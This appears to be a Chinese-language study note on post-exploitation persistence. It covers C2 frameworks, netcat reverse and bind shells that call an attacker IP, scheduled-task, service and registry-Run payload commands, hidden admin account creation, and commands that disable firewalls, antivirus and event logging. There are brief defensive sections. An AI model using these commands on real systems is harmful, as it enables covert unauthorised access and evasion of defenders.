# 權限持久化

## 權限持久化概述

- **Persistence**（權限持久化）：攻擊者用來在初始入侵後維持對被入侵系統長期訪問的技術
  - 用於深化對系統的控制
  - 長期監控數據流
  - 即使系統重啟、密碼變更或其他中斷情況下仍能維持訪問權限

## 主要技術類型

- **Command and Control (C2) Frameworks**（命令與控制框架）：用於遠程控制被入侵系統的方法
  - 通常採用加密通信以逃避安全系統的檢測
  - 允許攻擊者從中央位置管理多個被入侵系統
  - 可實現多個操作員與單個 C2 伺服器交互，控制數百台受感染機器
  - 提供單一界面來管理和控制所有被入侵系統
  - 包含內建機制來維持即使在系統重啟或應用安全措施後的訪問權限

- **Automating Persistence**（自動化持久性）：使用自動化方法保持後門存在
  - 自動化排程任務以重新安裝後門
  - 創建服務來重新建立 C2 通道
  - 修改配置以在連接中斷時恢復憑證

- **Remote Shells**（遠程命令列）：維持對系統控制的基本方法
  - 包括反向殼層（Reverse Shell）和綁定殼層（Binding Shell）
  - 允許實時執行命令和數據移除
  - 可透過 Metasploit 等工具實現

- **Backdoors**（後門）：隱蔽重新進入系統的方法
  - 安裝 Rootkits 和其他工具以允許隱秘重入
  - 即使在初始訪問點被關閉後仍能保持訪問
  - 包括 Remote Access Trojans（遠程訪問木馬）等方法

- **Account Credentials**（帳戶憑證）：收集和使用憑證來維持訪問
  - 用於橫向移動穿越網路
  - 在需要時重新建立訪問

- **Browser-Based Persistence**（基於瀏覽器的持久化）：利用瀏覽器維持持久性訪問
  - 使用瀏覽器擴充功能維持持久性訪問

- **Security Control Tampering**（篡改安全控制）：操縱或禁用安全軟體
  - 包括篡改防火牆、防毒軟體和日誌等
  - 用於隱藏攻擊者在系統中的存在和活動

## 持久性技術的目標

- **Post-Exploitation**（後期利用）：在初始入侵後建立持久存在
  - 避免需要重新入侵系統
  - 進行數據竊取、橫向移動或控制

- **System Takeover**（系統接管）：獲得對系統的完全控制
  - 可能包括提升權限
  - 修改系統行為以服務攻擊者的目的
  - 利用被入侵系統進行進一步攻擊、托管惡意內容或挖掘加密貨幣

## 權限持久化技術的最佳實踐（對攻擊者）

- 加密 C2 通信流量（如使用 HTTPS 或 DNS）
- 使用後備通道以提供備援
- 避免重複使用相同方法，輪換持久性方法以混淆防禦者

# 命令與控制框架（C2 Frameworks）

## 概述

- **Command and Control Frameworks**（命令與控制框架）：
  - 是後滲透階段的重要工具
  - 允許滲透測試人員管理被入侵的系統、執行命令、維持對目標網路的持續存取

## 主要 C2 框架

### Empire

- **Empire**（Empire 框架）：後滲透框架
  - 利用 PowerShell 和 Python 在 Windows 和 Linux 系統上執行滲透測試
  - 包含多種模組，可用於鍵盤記錄、憑證傾印、橫向移動等任務
  - 能夠不依賴 powershell.exe 運行，幫助規避傳統安全措施的檢測
  - 目前由 Kali Linux 社群維護，原開發者已不再維護
  - 可快速在網路中部署 PowerShell 代理（agents）執行複雜的後滲透任務
  - 雖然靈活強大，但其廣泛知名度意味著防禦人員常常尋找其特徵

### Covenant

- **Covenant**（Covenant 框架）：基於 .NET 的命令與控制框架
  - 設計用於跨平台（Windows、Linux 和 macOS）利用 .NET 框架的能力
  - 支援多種後滲透活動，著重使用 .NET 框架以避免檢測
  - 提供現代化的網頁介面管理被入侵的系統
  - 使用者友好且高效率
  - 跨平台特性和豐富的模組庫使其成為多功能工具

### Mythic

- **Mythic**（Mythic 框架）：跨平台、命令列為基礎的開源 C2 框架
  - 支援多種不同的 payload
  - 以模組化架構聞名，允許使用者輕鬆自定義和擴展功能
  - 提供使用者友好界面和強大的 API 支援
  - 能夠與不同 payload 整合，強調模組化
  - 滲透測試人員可根據具體需求定制後滲透策略
  - 如使用 Apfell payload 管理被入侵的 macOS 系統
  - 靈活性和全面的功能集適合管理複雜的滲透測試
  - 主要使用 Python 編寫，適合不同技能水平的攻擊者

# 自動持久化技術

- 三種主要持久化策略：
  1. 排程任務/Cron 工作
  2. 服務建立
  3. 修改登錄檔機碼

## 排程任務和 Cron 工作

- **Scheduled Tasks**（排程任務，Windows）/ **Cron Jobs**（Cron 工作，Unix）：在特定時間或間隔自動執行任務的機制
  - 確保惡意程式碼或後門能自動執行，即使在系統重啟後仍可維持存取

- **Windows 排程任務指令**：
```
schtasks /create /sc hourly /tn "UpdateCheck" /tr "C:\payload.exe"
```
  - `/create`：建立新的排程任務
  - `/sc hourly`：設定排程類型為每小時執行
  - `/tn "UpdateCheck"`：設定任務名稱為"UpdateCheck"
  - `/tr "C:\payload.exe"`：指定要執行的程式路徑

- **Unix Cron 工作指令**：
```
0 * * * * /etc/payload.sh
```
  - `0`：指定任務在每小時的第 0 分鐘執行
  - `* * * *`：代表任意時、日、月、週
  - `/etc/payload.sh`：指定要執行的指令碼路徑

## 服務建立

- **Service Creation**（服務建立）：提供一個更隱蔽且持久的存取維持方法
  - 服務通常以系統權限運行
  - 可配置為系統啟動時自動啟動

- **Windows 服務建立指令**：
```
sc create MaliciousService binpath="C:\payload.exe" start=auto
```
  - 建立一個名為 "MaliciousService" 的服務
  - 系統啟動時自動執行

- **Unix 系統服務建立**：
  - 將指令碼加入 `/etc/init.d/` 目錄
  - 使用 `update-rc.d` 指令配置啟動時執行

## 修改登錄檔機碼

- **Registry Keys**（登錄檔機碼）：在 Windows 中存儲作業系統和應用程式底層設置的階層式資料庫
  - 每個節點稱為鍵（key）
  - 每個鍵可以包含子鍵和資料項（稱為值）

- **Run Key 修改**：
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\payload.exe"
```
  - 將惡意程式加入每次使用者登入時自動執行的項目中

- **常用持久化登錄檔位置**：
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`（當前使用者）
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`（系統全局，需要管理員權限）
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`（僅執行一次）

- **進階登錄檔持久化技術**：
  - 使用 PowerShell 修改登錄檔實現持久化
  - 利用 WMI 訂閱事件來觸發惡意程式執行
  - 修改 UserInit 相關登錄檔鍵值改變系統登入後的 shell

## 綜合應用

- 實際滲透測試中應結合多種持久化方法：
  - 建立排程任務確保每小時執行惡意程式
  - 設置系統服務確保開機時啟動惡意程式
  - 修改登錄檔確保使用者登入時執行惡意程式

- 多種方法並用的優勢：
  - 提高在目標環境中的存活率
  - 增加檢測難度
  - 確保在各種系統狀態下都能維持存取權

# 遠端殼層

- **Remote Shell**（遠端殼層）：一種在已被入侵的系統上建立和維持控制的工具。
  - 主要有兩種類型：反向 Shell（Reverse Shell）和綁定（正向）Shell（Bind Shell）

## 正向殼層綁定

- **Bind Shell**（綁定 Shell）：一種遠端 Shell，目標機器開放特定端口並監聽攻擊者的連接。
  - 攻擊者是發起連接的一方，而不是目標機器
  - 攻擊者可以連接到這個端口以獲取訪問權限
  - 在惡意軟體中，綁定 Shell 通常被稱為後門（backdoor）

- **使用 Netcat 建立綁定 Shell 的步驟**：
  1. 在目標機器上設置監聽： `nc -lvp 4444 -e /bin/bash`
     - 與反向 Shell 相比，這次是在目標機器上設置監聽
     - `-e` 參數指定要讓目標機器執行的命令
  
  2. 在攻擊者機器上發起連接： `nc 10.0.0.3 4444`
     - 攻擊者連接到目標機器的開放端口

## 反向殼層綁定

- **Reverse Shell**（反向 Shell）：一種遠端殼層，由目標機器主動向攻擊者的機器發起連接。
  - 常用於繞過防火牆和網路安全設備，因為對外連線通常被防火牆允許
  - 連接是由被入侵的機器發起，而非攻擊者的機器

- **使用 Netcat 建立反向殼層的步驟**：
  1. 在攻擊者機器上設置監聽器： `nc -lvp 4444`
     - `nc`：呼叫 Netcat 程式
     - `-l`：監聽傳入連接
     - `-v`：啟用詳細模式，提供更詳細的輸出
     - `-p`：指定監聽的端口（此例為 4444）
  
  2. 在目標機器上執行連接攻擊者的命令： `nc 10.0.0.2 4444 -e /bin/bash`
     - `nc`：呼叫 Netcat 程式
     - `10.0.0.2`：攻擊者的 IP 地址
     - `4444`：連接的端口號（必須與攻擊者監聽的端口相匹配）
     - `-e /bin/bash`：連接成功後目標機器執行 bash 程式（shell），給攻擊者提供目標機器的 shell

## 重要性與應用

- 了解和使用遠端 Shell（如反向 Shell 或綁定 Shell）是滲透測試的基本技能
- 反向 Shell 由被入侵機器發起，用於繞過通常限制較少的出站連接的防火牆規則
- 綁定 Shell 由攻擊者或滲透測試人員向被入侵主機發起連接
- 掌握如何設置和執行這些 Shell，可以維持對入侵系統的控制並有效繞過網路防禦

## 重要工具

- **Netcat**（網路瑞士軍刀）：一個功能強大的網路工具，可用於連接各種服務如 Telnet、RSH、HTTP 等
  - 支援 TCP/UDP 協議
  - 因其強大的功能，常被駭客用來建立後門或設置綁定和反向 Shell
  - 基本用法：
    - 連接到某處：`nc [-options] hostname port[s] [ports] ...`
    - 監聽傳入連接：`nc -l -p port [-options] [hostname] [port]`

# 後門、Rootkit、木馬和網頁 Shell

- **Backdoor（後門）**：通過繞過正常認證機制，讓攻擊者能夠存取系統、網路或應用程式的方法。
  - 允許攻擊者無需再次利用漏洞即可重新進入系統。
  - 類似於擁有祕密鑰匙，即使主入口已受保護，攻擊者仍能通過隱藏後門出入。
  - 可用於執行命令、提取資料或部署進一步惡意活動。

- **Rootkit（隱匿程式）**：被設計用來隱藏特定程序或程式，使其免於常規檢測方法，並為攻擊者提供持續的特權存取。
  - 能夠在作業系統的核心層級運作，可以攔截和修改系統呼叫。
  - 極難檢測和移除。
  - 案例：ZeroAccess rootkit 在 Windows 機器上創建隱藏檔案系統，隱藏活動。
  - 可以禁用安全軟體、隱藏網路連接、阻止系統修補。
  - Stuxnet 蠕蟲使用 rootkit 技術隱藏其存在，在伊朗核計劃中進行破壞活動。

- **Trojan（木馬）**：偽裝成合法軟體的惡意軟體。
  - 與病毒和蠕蟲不同，木馬不會自我複製，而是依賴使用者執行。
  - 安裝後可以為攻擊者開啟後門，讓攻擊者控制受感染系統。
  - 通過釣魚郵件、惡意網站或與合法軟體捆綁傳播。
  - 案例：Zeus 木馬透過記錄鍵盤按鍵和捕獲螢幕截圖來竊取銀行資訊。
  - 特殊木馬可專門用於：
    - 禁用安全措施（如防毒軟體和防火牆）
    - 創建殭屍網路（Botnet）進行協調攻擊（DDoS、發送垃圾郵件、挖掘加密貨幣）
  - Mirai 木馬感染物聯網設備並發動大規模 DDoS 攻擊。

- **Web Shell（網頁 Shell）**：通過網頁介面在伺服器上執行命令。
  - 通常使用 PHP、ASP 或 JSP 等網頁開發語言編寫。
  - 案例：China Chopper 網頁 Shell，一個小型但功能強大的腳本，為攻擊者提供簡單但強大的介面。
  - 常被忽視，可輕易隱藏在合法網頁應用程式檔案中，難以檢測。
  - 提供攻擊者維持長期存取的多用途工具。
  - 2017 年 Equifax 資料外洩案中，攻擊者利用網頁應用程式漏洞上傳網頁 Shell。
  - 可用於執行任意命令、操作檔案，並創建額外後門。
  - 可安裝其他惡意軟體（如鍵盤記錄器、勒索軟體）。

# 帳號建立

## 基本概念

- **Post-exploitation Phase**（後期滲透階段）：攻擊者成功入侵系統後的活動階段
  - 用於維持存取權限、收集更多資料及進一步滲透網路
  - 主要目標是建立持久性存取，確保即使原始漏洞被修補或系統重啟後仍能返回

## 獲取憑證的方法

- **Credential Dumping**（憑證傾印）：從系統記憶體中提取密碼、雜湊值和認證權杖
  - 例如使用 Mimikatz 工具可從 Windows 機器記憶體中提取明文密碼

- **Keylogging**（鍵盤記錄）：安裝鍵盤記錄器捕捉使用者輸入的按鍵
  - 例如 Emotet 惡意軟體常會安裝鍵盤記錄器來捕捉憑證

- **Phishing**（網路釣魚）：製作具說服力的電子郵件或訊息，誘使使用者在假冒登入頁面輸入憑證
  - 著名案例：2016年針對希拉蕊競選主席的釣魚攻擊，攻擊者發送假冒的 Google 登入頁面

## 建立新帳號的技術

- **Windows 系統帳號建立**：
  - 使用 `net user` 指令：`net user backup_admin P@ssw0rd /add`
  - 賦予管理權限：`net localgroup administrators backup_admin /add`

- **Linux 系統帳號建立**：
  - 使用 `useradd` 指令：`sudo useradd -m -s /bin/bash backup_admin`
  - 設定密碼：`echo "backup_admin:P@ssw0rd" | sudo chpasswd`
  - 賦予 sudo 權限：`sudo usermod -aG sudo backup_admin`

- **PAM Backdoor**（PAM 後門）：修改認證模組以允許後門存取
  - PAM(Pluggable Authentication Modules)是一種 Linux 系統的認證框架，允許應用程式使用一套統一的介面來管理不同的認證方式
  - PAM 後門能實現身份驗證繞過和憑證竊取功能
  - 可使用硬編碼密碼讓任何用戶驗證，從而實現任何系統帳戶的冒充

- **Duplicate Password Hash Attack**（重複密碼雜湊攻擊）：
  - 這是攻擊者自動化放置後門帳戶的策略

## 隱藏技術

- 使用容易與既有帳號混淆的名稱（例如 backup_admin）避免引起懷疑
- 在 Windows 中操作登錄檔以隱藏登入畫面上的用戶帳號
- 在 Linux 中修改 PAM 配置來允許後門存取

## 安全建議

- 檢查受影響系統是否有其他惡意後門，如反向 Shell、反向代理或下載器
- 移除並阻止在分類過程中識別的惡意成品
- 檢視相關用戶的權限，確保符合最小權限原則
- 調查受攻擊者威脅或使用的系統中的憑證洩露情況
- 重置受感染帳號的密碼以及其他可能被洩露的憑證

# 基於瀏覽器的持久化

## 基本概念

- **Browser-based persistence**（基於瀏覽器的持久化）：
  - 利用網頁瀏覽器作為媒介維持對被入侵系統的持續存取
  - 相對隱蔽，因為能混入使用者的日常瀏覽活動中
  - 由於瀏覽器為常用應用程式，惡意活動常被標準安全措施忽視

## 主要攻擊手法

### 惡意瀏覽器擴充功能

- **Malicious browser extensions**（惡意瀏覽器擴充功能）：
  - 小型軟體程式，原本用於自訂瀏覽體驗，但可被惡意利用
  - 能捕獲敏感資訊、重新導向流量或執行任意程式碼
  - 攻擊者透過社交工程或漏洞利用讓使用者安裝
  - 安裝後可獲得廣泛權限，如讀取與修改網站資料、捕捉按鍵輸入等

### Cookie 與本地儲存攻擊

- **Cookies**（Cookie）：
  - 瀏覽器儲存的小型資料片段，幫助網站記住使用者工作階段資訊
  - 可被操縱用於維持持久性攻擊

- **Local storage**（本地儲存）：
  - 現代瀏覽器功能，允許網站在用戶裝置上儲存較大量資料
  - 可被攻擊者操縱以儲存惡意程式或取得工作階段令牌

- **Session hijacking**（會話劫持）：
  - 透過 Cookie 盜竊實現
  - 使用各種技術如跨站腳本攻擊或中間人攻擊竊取會話 Cookie
  - 一旦獲取，可冒充使用者並維持對帳戶的存取
  - 根據 Digital Watch Observatory 的報告，網路犯罪份子在 Telegram 上交易近 940 億個被盜的瀏覽器 Cookie，其中 20% 仍然有效

### 瀏覽器設定與漏洞攻擊

- **Browser settings manipulation**（瀏覽器設定操縱）：
  - 修改首頁、搜尋引擎或代理設定來重新導向流量至惡意網站
  - 控制這些設定讓使用者持續暴露於惡意內容中

- **Browser vulnerabilities exploitation**（瀏覽器漏洞利用）：
  - 利用瀏覽器本身的漏洞獲得持久存取
  - 如 Pwn2Own 競賽常揭示 Chrome、Firefox、Safari 等瀏覽器的零日漏洞
  - 這些漏洞可用於執行任意程式碼、提權和維持系統持久性

## 真實案例

- **Copyfish 事件**（2017）：
  - Chrome 的 Copyfish 擴充功能被劫持
  - 攻擊者利用它向使用者推送廣告和垃圾訊息

- **Telegram 漏洞**（2018）：
  - Telegram 網頁客戶端的本地儲存漏洞
  - 攻擊者能注入惡意程式碼存儲在瀏覽器的本地儲存中
  - 每次使用者開啟瀏覽器時執行，維持對 Telegram 帳戶的持續存取
  - Telegram 的會話劫持甚至可以繞過雙因素驗證

- **FireSheep 工具**：
  - 用於透過 Wi-Fi 網路劫持未加密的工作階段 Cookie
  - 允許攻擊者存取使用者的社群媒體帳戶

## 防禦措施

- **管理瀏覽器擴充功能**：定期檢查和管理已安裝的擴充功能

- **使用安全功能**：
  - HTTPS：確保加密連線
  - Content Security Policy (CSP)：限制資源載入和執行

- **保持更新**：確保瀏覽器擁有最新安全補丁

- **警惕異常行為**：監控瀏覽器異常行為以檢測潛在威脅

- **安裝擴充功能時保持謹慎**：僅從官方來源安裝，檢查權限要求

- **啟用雙因素認證**：雖然某些工作階段劫持攻擊能繞過，但仍能提供額外安全層

# 竄改安全控制

## Windows 環境持久性技術

- **Firewall Disabling**（防火牆停用）：
  - 使用命令：`netsh advfirewall set allprofiles state off`
  - 需要管理員權限執行

- **Antivirus Disabling**（防毒軟體停用）：
  - 可使用 PowerShell 停用 Windows Defender
  - 主要目標是關閉即時監控功能

- **Registry Modifications**（登錄檔修改）：
  - 修改登錄位置：`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Current Version\Run`
  - 程式會在系統啟動時自動執行

- **Event Log Disabling**（事件日誌停用）：
  - 使用命令：`sc stop EventLog`（停止日誌服務）
  - 使用命令：`sc config EventLog start=disabled`（設定為開機不自動啟動）

- **Scheduled Tasks**（排程任務）：
  - 建立排程任務：`schtasks /create /tn "update" /tr "C:\update.bat" /sc onstart`
  - 設定在系統啟動時自動執行惡意腳本

- **User Account Control (UAC)**（使用者帳戶控制）：
  - 透過登錄檔或本機安全性原則設定降低或關閉 UAC
  - 使惡意程式更容易獲得管理權限

## Linux 環境持久性技術

- **Firewall Disabling**（防火牆停用）：
  - UFW系統：`ufw disable`
  - FirewallD系統：`systemctl stop firewalld`

- **Antivirus Disabling**（防毒軟體停用）：
  - ClamAV：`systemctl stop clamav-freshclam`

- **Security Policies Modification**（安全策略修改）：
  - 修改 PAM（Pluggable Authentication Modules）配置
  - 位於 `/etc/pam.d/` 目錄

- **Startup Scripts**（啟動腳本）：
  - 在 `/etc/rc.local` 中添加腳本（系統重啟時執行）
  - 使用 systemd-rc-local-generator 將 rc.local 轉換為服務

- **Cron Jobs**（排程任務）：
  - 編輯 crontab：`crontab -e`
  - 添加重啟執行命令：`@reboot /etc/maliciousscript.sh`

- **Security Logging Disabling**（安全日誌停用）：
  - 停止 rsyslog 服務：`systemctl stop rsyslog`
  - 修改 logrotate 配置使日誌更頻繁被刪除

- **Sudo Configuration**（Sudo 配置修改）：
  - 修改 `/etc/sudoers` 檔案
  - 設定特定使用者可以無密碼執行命令

## 系統服務持久性

- **Systemd Services**（系統服務）：
  - 服務單元文件位於：
    - `/etc/systemd/system/`
    - `/usr/lib/systemd/system/`
    - `/home/$username/.config/systemd/user/`
  - 使用 `systemctl` 命令管理
  - 相關可疑命令：`systemctl start` 和 `systemctl enable`

- **NetworkManager**（網路管理器）：
  - 攻擊者可在 NetworkManager 的 dispatcher 目錄放置腳本
  - 這些腳本在網路事件觸發時執行，例如當特定網路介面上線時

## 持久性檢測方法

- **系統服務監控**：
  - 監控 `systemctl` 命令的執行
  - 追蹤系統服務單元文件的修改

- **腳本監控**：
  - 檢查自動啟動腳本中的可疑內容
  - 監視系統啟動和桌面環境啟動時執行的程序
